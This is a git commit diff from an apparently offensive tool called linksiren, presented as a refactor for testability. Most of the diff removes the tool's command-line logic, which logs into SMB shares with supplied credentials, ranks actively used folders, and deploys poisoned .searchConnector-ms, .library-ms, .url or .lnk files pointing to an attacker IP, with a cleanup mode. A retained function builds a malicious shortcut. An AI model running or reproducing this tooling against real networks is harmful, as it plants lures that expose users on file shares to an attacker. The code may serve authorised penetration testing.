28a1bbbd9bc7c5c46796be25639c4103f0af549c
bob <georgejosephhamilton@gmail.com>
2024-03-02 09:14:51 -0500

    Begin Refactor
    Begin refactoring code for testability.

--- src/linksiren/functions.py
+++ src/linksiren/functions.py
@@ -6,11 +6,9 @@ deploy multiple types of payloads to the identified locations. Lastly, this modu
 bulk cleanup multiple types of payloads from the identified locations.
 """
 from datetime import datetime, timedelta
-import sys
-import json
-import argparse
 from smbclient import ClientConfig, scandir, remove, open_file
 from smbprotocol.exceptions import SMBException
+from pathlib import Path
 
 def read_targets(targets_file):
     """
@@ -186,16 +184,16 @@ def write_payload_local(payload_name, payload_contents):
     """
     if payload_name.split('.')[-1] == '.lnk':
         try:  # Try to write the payload
-            with open_file(payload_name, mode='wb') as payload_file:
+            with open(payload_name, mode='wb') as payload_file:
                 payload_file.write(payload_contents)
         except:  # Print a message and don't track the folder if writing the payload to it fails
             print(f'Failed to write payload at: {payload_name}')
             return False
     else:
         try:  # Try to write the payload
-            with open_file(payload_name, mode='w', newline='\r\n') as payload_file:
+            with open(payload_name, mode='w', newline='\r\n') as payload_file:
                 payload_file.write(payload_contents)
-        except:  # Print a message and don't track the folder if writing the payload to it fails
+        except Exception as e:  # Print a message and don't track the folder if writing the payload to it fails
             print(f'Failed to write payload at: {payload_name}')
             return False
 
@@ -349,213 +347,3 @@ def create_lnk(attacker_ip):
         shortcut[target_unc_offset + i] = target_unc_path[i]
 
     return shortcut
-
-
-def main():
-    """
-    main()
-
-    Main function for command line usage.
-    """
-    # Parse script arguments
-    parser = argparse.ArgumentParser(
-        description='Identify and rate folders in shares based on access frequency, deploy '
-                    'malicious URL files, and cleanup results.')
-
-    # Modes
-    subparsers = parser.add_subparsers(title='Modes', dest='mode')
-
-    # Arguments for generating a payload locally
-    generate_parser = subparsers.add_parser('generate', help='Output specified payload file'
-                            'to the current directory instead of a remote location.')
-    generate_required_group = generate_parser.add_argument_group('Required Arguments')
-    generate_required_group.add_argument('-a', '--attacker', required=True,
-                        help='Attacker IP or hostname to place in malicious URL')
-    generate_parser.add_argument('-n', '--payload', default='@Test_Do_Not_Remove.searchConnector-ms', help='(Default: @Test_Do_Not_Remove.searchConnector-ms) Name '
-                        'of payload file ending in .library-ms, .searchConnector-ms, .lnk, or .url')
-
-    # Arguments for outputting rankings of potential folders into which to place poisoned files
-    rank_parser = subparsers.add_parser('rank', help='Output identified subfolders and rankings to folder_rankings.txt')
-    rank_required_group = rank_parser.add_argument_group('Required Arguments')
-    rank_required_group.add_argument('-u', '--username', required=True, help='Username for authenticating to each '
-                        'share')
-    rank_required_group.add_argument('-p', '--password', required=True, help='Password for authenticating to each '
-                        'share')
-    rank_required_group.add_argument('-d', '--domain', required=True, help='Domain for authenticating to each share.'
-                        'Specify "." for local authentication')
-    rank_required_group.add_argument('-t', '--targets', required=True,
-                        help='Path to a text file containing UNC paths to file shares / base '
-                        'directories within which to rank folders as potential locations for placing'
-                        ' poisoned files.')
-    rank_parser.add_argument('-md', '--max-depth', type=int, default=3, help='(Default: 3) The maximum depth of folders to '
-                        'search within the target.')
-    rank_parser.add_argument('-at', '--active-threshold', type=int, default=2, help='(Default: 2) Number of days as an '
-                        'integer for active files.')
-    rank_parser.add_argument('-f', '--fast', action='store_true', default=False, help='(Default: False) Mark folders active as'
-                        ' soon as one active file in them is identified and move on. Ranks are '
-                        'all set to 1 assigned.')
-
-    # Arguments for identifying and outputting UNC paths to optimal folders into which to place poisoned files
-    idenitfy_parser = subparsers.add_parser('identify', help='Identify target folders for payload distribution '
-                                            'and output to folder_targets.txt')
-    identify_required_group = idenitfy_parser.add_argument_group('Required Arguments')
-    identify_required_group.add_argument('-u', '--username', required=True, help='Username for authenticating to each '
-                        'share')
-    identify_required_group.add_argument('-p', '--password', required=True, help='Password for authenticating to each '
-                        'share')
-    identify_required_group.add_argument('-d', '--domain', required=True, help='Domain for authenticating to each share.'
-                        'Specify "." for local authentication')
-    identify_required_group.add_argument('-t', '--targets', required=True,
-                        help='Path to a text file containing UNC paths to file shares / base '
-                        'directories for deployment or from which to remove payload files')
-    idenitfy_parser.add_argument('-md', '--max-depth', type=int, default=3, help='(Default: 3) The maximum depth of folders to '
-                        'search within the target')
-    idenitfy_parser.add_argument('-at', '--active-threshold', type=int, default=2, help='(Default: 2) Max number of days since '
-                                 ' within which a file is considered active.')
-    idenitfy_parser.add_argument('-f', '--fast', action='store_true', default=False, help='(Default: False) Mark folders active as'
-                        ' soon as one active file in them is identified and move on. Ranks are '
-                        'all set to 1.')
-    idenitfy_parser.add_argument('-mf', '--max-folders-per-target', type=int, default=10, help='(Default: 10) Maximum number of '
-                            'folders to output as deployment targets per supplied target share or '
-                            'folder.')
-
-    # Arguments for deploying poisoned files to specified locations
-    deploy_parser = subparsers.add_parser('deploy', help='Deploy payloads to all folder UNC '
-                        'paths listed one per line in the file specified using --targets')
-    deploy_required_group = deploy_parser.add_argument_group('Required Arguments')
-    deploy_required_group.add_argument('-u', '--username', required=True, help='Username for authenticating to each '
-                        'share')
-    deploy_required_group.add_argument('-p', '--password', required=True, help='Password for authenticating to each '
-                        'share')
-    deploy_required_group.add_argument('-d', '--domain', required=True, help='Domain for authenticating to each share.'
-                        'Specify "." for local authentication')
-    deploy_required_group.add_argument('-t', '--targets', required=True,
-                        help='Path to a text file containing UNC paths to folders into which poisoned '
-                         'files will be deployed.')
-    deploy_required_group.add_argument('-a', '--attacker', required=True, help='Attacker IP or hostname to place in poisoned '
-                        'files.')
-    deploy_parser.add_argument('-n', '--payload', default='@Test_Do_Not_Remove.searchConnector-ms', help='(Default: @Test_Do_Not_Remove.searchConnector-ms) Name '
-                            'of payload file ending in .library-ms, .searchConnector-ms, .lnk, or .url')
-
-    # Arguments for cleaning up deployed payloads when finished
-    cleanup_parser = subparsers.add_parser('cleanup', help='Delete poisoned files from folder UNC paths'
-                                           'specified in --targets')
-    cleanup_required_group = cleanup_parser.add_argument_group('Required Arguments')
-    cleanup_required_group.add_argument('-u', '--username', required=True, help='Username for authenticating to each '
-                        'share')
-    cleanup_required_group.add_argument('-p', '--password', required=True, help='Password for authenticating to each '
-                        'share')
-    cleanup_required_group.add_argument('-d', '--domain', required=True, help='Domain for authenticating to each share.'
-                        'Specify "." for local authentication')
-    cleanup_required_group.add_argument('-t', '--targets', required=True,
-                        help='Path to a text file containing UNC paths to folders in which poisoned '
-                         'files are located.')
-    cleanup_required_group.add_argument('-a', '--attacker', required=True, help='Attacker IP or hostname to place in poisoned '
-                        'files.')
-    cleanup_parser.add_argument('-n', '--payload', default='@Test_Do_Not_Remove.searchConnector-ms', help='(Default: @Test_Do_Not_Remove.searchConnector-ms) Name '
-                            'of payload file ending in .library-ms, .searchConnector-ms, .lnk, or .url')
-
-    # Parse arguments
-    args = parser.parse_args()
-
-    if args.mode == 'generate':
-        # Validate the provided payload name and exit if it's invalid
-        available_extensions = ['searchConnector-ms', 'library-ms', 'url', 'lnk']
-        if not is_valid_payload_name(args.payload, available_extensions):
-            return
-
-        # Select a template file name based on the payload name
-        template_name = f'template.{args.payload.split(".")[-1]}'
-
-        if template_name == 'template.lnk':
-            payload_contents = create_lnk(args.attacker)
-
-        else:
-            # Read the payload template contents into a file and substitute the connection string
-            # to the attacker as appropriate.
-            with open(template_name, 'r', encoding="utf-8") as template_file:
-                payload_contents = template_file.read()
-                payload_contents = payload_contents.format(attacker_ip=args.attacker)
-
-        # Write payload to file in the current directory
-        write_payload_local(args.payload, payload_contents)
-
-    elif args.mode == 'rank': # If rank functionality is used to rank active folders
-        # Setup default login credentials
-        ClientConfig(username=f'{args.domain}\\{args.username}', password=args.password)
-
-        # Read share targets into an array
-        targets = read_targets(args.targets)
-
-        sorted_rankings = get_sorted_rankings(targets, args.active_threshold, args.max_depth,
-                                              args.fast)
-
-        # Write all reviewed subfolders and their rankings to a file
-        with open('folder_rankings', mode='w', encoding="utf-8") as f:
-            f.write(json.dumps(sorted_rankings, indent=4, sort_keys=False))
-
-    elif args.mode == 'identify':  # Else if identification functionality is used to identify active folders
-        # Setup default login credentials
-        ClientConfig(username=f'{args.domain}\\{args.username}', password=args.password)
-
-        # Read share targets into an array
-        targets = read_targets(args.targets)
-
-        sorted_rankings = get_sorted_rankings(targets, args.active_threshold, args.max_depth,
-                                              args.fast)
-        filtered_targets = filter_targets(targets, sorted_rankings, args.max_folders_per_target)
-
-        # Write the highest ranked active shares to folder_targets.txt for review and deployment
-        write_list_to_file(filtered_targets, 'folder_targets.txt')
-
-    elif args.mode == 'deploy':  # Else if the deploy functionality is used to deploy payloads
-        # Setup default login credentials
-        ClientConfig(username=f'{args.domain}\\{args.username}', password=args.password)
-
-        # Read share targets into an array
-        targets = read_targets(args.targets)
-
-        payloads_written = []  # Track the UNC path of the folder to which each payload is written
-
-        # Validate the provided payload name and exit if it's invalid
-        available_extensions = ['searchConnector-ms', 'library-ms', 'url', 'lnk']
-        if not is_valid_payload_name(args.payload, available_extensions):
-            return
-
-        # Select a template file name based on the payload name
-        template_name = f'template.{args.payload.split(".")[-1]}'
-
-        if template_name == 'template.lnk':
-            payload_contents = create_lnk(args.attacker)
-
-        else:
-            # Read the payload template contents into a file and substitute the connection string
-            # to the attacker as appropriate.
-            with open(template_name, 'r', encoding="utf-8") as template_file:
-                payload_contents = template_file.read()
-                payload_contents = payload_contents.format(attacker_ip=args.attacker)
-
-        # Iterate over each target folder path
-        for folder_unc in targets:
-            # Attempt to write a paylaod to each location
-            write_successful = write_payload_remote(folder_unc, args.payload, payload_contents)
-            if write_successful:
-                payloads_written.append(folder_unc)
-
-        # Save the list of payloads successfully written for easy cleanup
-        write_list_to_file(payloads_written, 'payloads_written.txt', 'a')
-
-    elif args.mode == 'cleanup':  # Else if the cleanup functionality is used to delete deployed payloads
-        # Setup default login credentials
-        ClientConfig(username=f'{args.domain}\\{args.username}', password=args.password)
-
-        # Read share targets into an array
-        targets = read_targets(args.targets)
-
-        # Iterate over each folder where payloads were deployed
-        for payload_folder in targets:
-            # Delete the payload at the specified path
-            delete_payload(payload_folder, args.payload)
-
-if __name__ == "__main__":
-    main()
